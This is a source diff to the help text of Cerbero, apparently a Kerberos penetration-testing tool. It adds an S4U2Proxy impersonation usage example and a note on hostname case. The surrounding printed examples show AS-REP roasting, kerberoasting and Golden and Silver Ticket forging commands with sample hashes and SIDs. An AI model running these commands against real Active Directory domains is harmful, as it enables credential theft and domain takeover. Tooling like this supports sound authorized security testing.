@@ -264,12 +264,16 @@ pub fn get_cerbero_args() -> CerberoCommand {
     println!(
         "  ask-tgs -u administrator -p Password123! -d contoso.local -i 192.168.1.10 -s ldap/dc01"
     );
+    println!("  ask-s4u2proxy -u controlled_comp$ -p password -d example.com -i 10.11.10.1 --impersonate domain_admin -o ticket.ccache -s 'ldap/dc01.example.com'");
     println!("  asreproast -d contoso.local -i 192.168.1.10 -t users.txt -o hashes.txt");
     println!("  kerberoast -u administrator -p Password123! -d contoso.local -i 192.168.1.10 -t services.txt -o hashes.txt");
     println!("  convert -i ticket.ccache -o ticket.krb");
     println!("  convert -i ticket.kirbi -o ticket.ccache --format ccache");
     println!("  craft -u contoso.local/administrator --sid S-1-5-21-123456789-987654321-111111111 --aes256 <KRBTGT key> (Golden Ticket)");
     println!("  craft -u under.world/kratos --sid S-1-5-21-658410550-3858838999-180593761 --ntlm 29f9ab984728cc7d18c8497c9ee76c77 -s cifs/styx,under.world (Silver Ticket)");
+    println!();
+    println!("Note: S4U2Proxy tickets require EXACT hostname case matching when connecting.");
+    println!("      Use the same hostname in 'connect -i' as specified in '-s ldap/<hostname>'");
 
     let mut rl = match HistoryEditor::new("cerbero") {
         Ok(editor) => editor,
